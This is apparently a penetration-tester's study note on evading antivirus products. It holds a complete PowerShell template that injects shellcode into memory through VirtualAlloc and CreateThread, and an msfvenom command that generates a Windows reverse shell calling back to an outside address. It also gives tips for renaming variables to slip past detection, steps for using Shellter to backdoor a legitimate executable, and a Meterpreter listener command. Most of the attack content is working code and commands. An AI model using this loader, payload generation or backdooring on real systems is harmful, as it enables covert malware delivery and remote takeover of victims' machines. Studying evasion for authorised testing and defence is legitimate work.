---
tags: meterpreter, shellter
---
## Testing for AV Evasion

> As a first step when testing AV products, we should verify that the antivirus is working as intended. Can do so by using a payload generated by Metasploit and scanning it with the AV.

### If we know the specifics of client's AV vendor

Build a dedicated VM that resembles the customer's environment as closely as possible. 

Make sure to disable sample submission!!

### If we don't know the specifics of client's AV vendor

Avoid using VirusTotal, as it sends submitted samples to AV vendors which have an active membership.

Use [AntiScan.Me](https://antiscan.me/) as an alternative to VirusTotal. 4 free scans per day.

## Evading AV with Thread Injection

Example: Remote Process Memory Injection targeting the current executing process, x86 PowerShell Interpreter.

Pros of executing a PS script:
- PS can directly interact with Windows API, allowing the implementation of the in-memory injection process in a PS script
- Compared to PE, it is more difficult for AV to determine if a PS script is malicious as it's run inside an interpreter and the script itself isn't executable code
- Even if the script is marked as malicious, it can be easily altered (e.g. variable names, comments, logic) without having to recompile anything

Basic template PS script for in-memory injection: (insert generated payload there)
```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint
flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc =
 Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
 
[Byte[]];
[Byte[]]$sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i),
$sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

Generate reverse shell payload for above script using msfvenom:
`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc`

If script is detected by AV, can try changing variable names (`$sc`, `$winfunc`, `-Name "Win32"` -> `"iWin32"`)

Note: AntiScan.Me does not accept ps1 files, so VirusTotal must be used instead

## Automating the Process

[Shellter](https://www.shellterproject.com/): A (free) dynamic shellcode injection tool for bypassing AV. Backdoors a valid non-malicious executable file with malicious shellcode payload.

Install Shellter:
`apt-cache search shellter`
`sudo apt install shellter`

Install Wine:
`sudo apt install wine`
`dpkg --add-architecture i386 && apt-get update && apt-get install wine32`
(Shellter is designed to run on Windows OS. Wine is a compatibility layer capable of running Win32 applications.)

Run Shellter:
`shellter`

Shellter modes:
- Manual: launch the PE we want to use for injection and allow us to manipulate it on a more granular level
- Auto

Stealth mode: If enabled, will attempt to restore the execution flow of the PE after our payload has been executed

Example: Use the Meterpreter_Reverse_TCP \[stager] payload
Set listener on Kali:
`msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"`


